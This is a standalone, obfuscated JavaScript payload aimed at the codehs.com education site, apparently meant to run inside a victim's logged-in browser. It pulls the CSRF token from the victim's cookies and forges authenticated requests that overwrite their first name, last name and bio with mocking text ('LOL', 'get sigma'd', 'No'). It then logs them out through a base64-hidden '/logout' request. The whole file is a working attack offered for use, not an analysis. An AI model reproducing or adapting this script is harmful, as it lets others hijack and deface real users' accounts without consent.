const _0x58834f = _0xdb37;
function getCSRFToken() {
    const _0x5d3972 = _0xdb37;
    return document[_0x5d3972(0x167)][_0x5d3972(0x168)](';\x20')[_0x5d3972(0x169)](_0x18a7d7 => _0x18a7d7[_0x5d3972(0x16a)](_0x5d3972(0x16b)))?.[_0x5d3972(0x168)]('=')[0x1];
}
function _0xdb37(_0x441743, _0x56c4ef) {
    const _0xdb3742 = _0x56c4();
    return _0xdb37 = function (_0x5d97b7, _0x3e6811) {
        _0x5d97b7 = _0x5d97b7 - 0x167;
        let _0x622f83 = _0xdb3742[_0x5d97b7];
        return _0x622f83;
    }, _0xdb37(_0x441743, _0x56c4ef);
}
function getProfileID() {
    const _0x42e38c = _0xdb37;
    fetch(_0x42e38c(0x16c), { 'credentials': _0x42e38c(0x16d) })[_0x42e38c(0x16e)](_0x5b0062 => _0x5b0062[_0x42e38c(0x16f)]())[_0x42e38c(0x16e)](_0x93a96d => {
        const _0x563287 = _0x42e38c;
        if (_0x563287(0x170) === _0x563287(0x171)) {
            const _0x44022e = _0x2d4891(), _0x3aaafc = _0xa89f4a(), _0x40d328 = new _0x298aa7({
                    'field': 'last_name',
                    'model': _0x563287(0x172),
                    'app': _0x563287(0x173),
                    'id': _0x44022e,
                    'ui': _0x563287(0x174),
                    'value': _0xb16d6a,
                    'csrfmiddlewaretoken': _0x3aaafc
                });
            return _0x1ea708(_0x563287(0x175), {
                'method': _0x563287(0x176),
                'headers': {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'X-CSRFToken': _0x3aaafc,
                    'X-Requested-With': _0x563287(0x177)
                },
                'body': _0x40d328,
                'credentials': _0x563287(0x16d)
            });
        } else {
            const _0x2486e7 = _0x93a96d[0x0][_0x563287(0x178)]['id'];
            return _0x2486e7;
        }
    });
}
function getUserId() {
    return window['userData']['id'];
}
function updateLastName(_0x819a87) {
    const _0x26e693 = _0xdb37, _0x5cf684 = getUserId(), _0x56b2e7 = getCSRFToken(), _0x4ed952 = new URLSearchParams({
            'field': _0x26e693(0x179),
            'model': _0x26e693(0x172),
            'app': _0x26e693(0x173),
            'id': _0x5cf684,
            'ui': _0x26e693(0x174),
            'value': _0x819a87,
            'csrfmiddlewaretoken': _0x56b2e7
        });
    return fetch(_0x26e693(0x175), {
        'method': _0x26e693(0x176),
        'headers': {
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-CSRFToken': _0x56b2e7,
            'X-Requested-With': _0x26e693(0x177)
        },
        'body': _0x4ed952,
        'credentials': 'include'
    });
}
function updateFirstName(_0x445d7d) {
    const _0x21d752 = _0xdb37, _0x133d2f = getUserId(), _0x351c69 = getCSRFToken(), _0x3fa951 = new URLSearchParams({
            'field': _0x21d752(0x17a),
            'model': _0x21d752(0x172),
            'app': _0x21d752(0x173),
            'id': _0x133d2f,
            'ui': _0x21d752(0x174),
            'value': _0x445d7d,
            'csrfmiddlewaretoken': _0x351c69
        });
    return fetch(_0x21d752(0x175), {
        'method': _0x21d752(0x176),
        'headers': {
            'Content-Type': _0x21d752(0x17b),
            'X-CSRFToken': _0x351c69,
            'X-Requested-With': _0x21d752(0x177)
        },
        'body': _0x3fa951,
        'credentials': _0x21d752(0x16d)
    });
}
function _0x56c4() {
    const _0xca265b = [
        'cookie',
        'split',
        'find',
        'startsWith',
        'csrftoken=',
        'https://codehs.com/api/users/',
        'include',
        'then',
        'json',
        'DRxnh',
        'wJxCb',
        'User',
        'core',
        'editable_text',
        'https://codehs.com/ajax_ui',
        'POST',
        'XMLHttpRequest',
        'userprofile',
        'last_name',
        'first_name',
        'application/x-www-form-urlencoded',
        'bio',
        'UserProfile',
        'get\x20sigma\x27d',
        'L2xvZ291dA=='
    ];
    _0x56c4 = function () {
        return _0xca265b;
    };
    return _0x56c4();
}
function updateBio(_0x2e9f9d) {
    const _0xfb7306 = _0xdb37, _0x314416 = getProfileID(), _0x558c7a = getCSRFToken(), _0x405043 = new URLSearchParams({
            'field': _0xfb7306(0x17c),
            'model': _0xfb7306(0x17d),
            'app': _0xfb7306(0x173),
            'id': _0x314416,
            'ui': 'editable_textarea',
            'value': _0x2e9f9d,
            'csrfmiddlewaretoken': _0x558c7a
        });
    return fetch(_0xfb7306(0x175), {
        'method': 'POST',
        'headers': {
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-CSRFToken': _0x558c7a,
            'X-Requested-With': _0xfb7306(0x177)
        },
        'body': _0x405043,
        'credentials': 'include'
    });
}
updateFirstName('LOL'), updateLastName(_0x58834f(0x17e)), updateBio('No'), fetch(atob(_0x58834f(0x17f)));
